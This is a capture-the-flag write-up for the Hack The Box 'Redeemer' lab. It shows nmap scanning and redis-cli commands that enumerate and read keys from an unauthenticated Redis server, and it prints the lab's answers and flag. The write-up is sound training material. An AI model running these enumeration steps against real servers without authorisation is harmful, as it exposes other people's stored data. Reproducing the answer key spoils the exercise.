# Hack The Box: Redeemer — Write-up
<img width="1376" height="768" alt="image" src="https://github.com/user-attachments/assets/6b253b69-f310-4008-af7e-dc41b4f59e12" />

## Introduction

Redeemer is a beginner-friendly machine from the Hack The Box Starting Point series.

The main focus of this machine is interacting with a Redis service that is exposed without authentication.

The goal is to:

Identify the open port

Connect to the Redis server

Retrieve server information

List the database contents

Extract the stored flag

## Target:
```
10.129.38.5
```
## Step 1 — Identify Open Ports

The first step is to scan the machine to discover open ports.
```
nmap -sV 10.129.38.5
```
The scan shows that port 6379 is open.
```
6379/tcp open redis
```
Port 6379 is the default port used by Redis servers.

Answer:
```
6379
```
## Step 2 — Identify the Running Service

The scan output already shows the running service.
```
6379/tcp open redis
```
Redis is a key-value database stored in memory, often used for:

caching

session storage

fast data retrieval

Answer:
```
redis
```
## Step 3 — Identify the Type of Database

Redis stores its data primarily in RAM, which allows extremely fast read and write operations.

Unlike traditional disk-based databases, Redis is classified as an:

In-Memory Database

Answer:
```
In-Memory Database
```
## Step 4 — Redis Command Line Tool

To interact with Redis from the terminal, the standard tool is redis-cli.

This utility allows sending commands directly to the Redis server.

Example:
```
redis-cli
```
Answer:
```
redis-cli
```
## Step 5 — Specify the Host

Since the Redis server is running on a remote machine, we must specify the host when connecting.

Example:
```
redis-cli -h 10.129.38.5 -p 6379
```
The flag used to specify the host is:
```
-h
```
Answer:
```
-h
```
## Step 6 — Retrieve Server Information

After connecting to Redis, we can retrieve server information using the INFO command.

Example:
```
redis-cli -h 10.129.38.5 -p 6379 INFO
```
This command displays various details about the Redis instance, including:

server statistics

memory usage

database information

Answer:
```
INFO
```
## Step 7 — Find the Redis Version

To view the server version, we can query the server section of the INFO output.
```
redis-cli -h 10.129.38.5 -p 6379 INFO server
```
Example output:

# Server
```
redis_version:5.0.7
```
Answer:
```
5.0.7
```
## Step 8 — Select a Redis Database

Redis supports multiple logical databases.

To switch between them, the SELECT command is used.

Example:

SELECT 0

Database 0 is the default database.

Answer:
```
select 0
```
## Step 9 — Count Keys in Database 0

To determine how many keys exist in the database, we inspect the Keyspace section of the INFO output.
```
redis-cli -h 10.129.38.5 -p 6379 INFO keyspace
```
Example output:
```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

This indicates that 4 keys exist in database 0.

Answer:
```
4
```
## Step 10 — List All Keys

To enumerate all keys stored in the selected database, the KEYS command is used.
```
redis-cli -h 10.129.38.5 -p 6379 KEYS *
```
The wildcard * instructs Redis to list all keys.

Answer:
```
keys *
```
Retrieve the Flag

After listing the keys, one of them contains the flag.

We can retrieve the value stored in a key using the GET command.
```
redis-cli -h 10.129.38.5 -p 6379 GET flag
```
Output:
```
03e1d2b376c37ab3f5319922053953eb
```
Because Redis is running without authentication, it allows direct access to the stored data.

Root Flag:
```
03e1d2b376c37ab3f5319922053953eb
```
Commands Used
```
nmap -sV 10.129.38.5

redis-cli -h 10.129.38.5 -p 6379 INFO

redis-cli -h 10.129.38.5 -p 6379 INFO server

redis-cli -h 10.129.38.5 -p 6379 INFO keyspace

redis-cli -h 10.129.38.5 -p 6379 KEYS *

redis-cli -h 10.129.38.5 -p 6379 GET flag
```
Conclusion

Redeemer is a great introductory machine that demonstrates the risks of running Redis without authentication.

Key takeaways:

Always secure Redis instances with authentication

Avoid exposing Redis directly to the internet

Misconfigured services can leak sensitive data with minimal effort
